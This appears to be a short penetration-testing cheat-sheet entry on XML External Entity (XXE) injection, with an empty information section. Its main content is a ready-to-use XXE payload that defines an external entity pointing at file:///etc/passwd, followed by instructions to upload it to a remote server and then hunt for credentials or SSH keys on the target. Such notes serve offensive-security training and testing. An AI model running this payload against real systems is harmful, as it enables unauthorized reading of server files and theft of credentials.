# XML External Entity \(XXE Injection\)

## XXE Information



## XXE Enumeration

If the web reports the content of an XML field, the attackers may be able to use an ENTITY to replace the reported field with the content of an internal file of the machine.

First, we must consider if we can upload files to the remote server, if yes. Then we may continue with a payload like the following:

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>AnySubject</Subject>
    <Content>AnyContent</Content>
</elements>
```

After writing a similar code, we should upload this file to the remote server and execute it. If successful, you may try to further enumerate the target system and gather credentials or SSH keys.

